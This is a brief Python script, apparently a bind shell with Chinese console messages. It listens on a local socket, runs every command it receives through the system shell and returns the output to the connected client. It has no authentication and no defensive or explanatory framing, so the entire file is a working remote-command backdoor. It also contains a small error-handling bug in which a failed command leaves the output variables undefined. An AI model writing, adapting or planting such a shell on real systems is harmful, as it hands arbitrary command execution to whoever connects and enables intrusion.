import socket,subprocess,time
s=socket.socket()
s.bind(('127.0.0.1',442))
print('正在等待连接')
s.listen(5)

sock,addr=s.accept()
print("conect from %s:%s"%addr)
while True:
    data=sock.recv(1024)
    cmd=data.decode()
    print('收到命令%s'%(cmd))
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        (stdoutput, erroutput)=p.communicate()
        p.wait()
        p.terminate()
    except:
        pass
    print('stdoutput:%s,erroutpurt:%s'%(stdoutput,erroutput))
    if stdoutput==b'':
        sock.send('shibai'.encode('gb2312'))
    else:
        sock.send(stdoutput)
s.close()
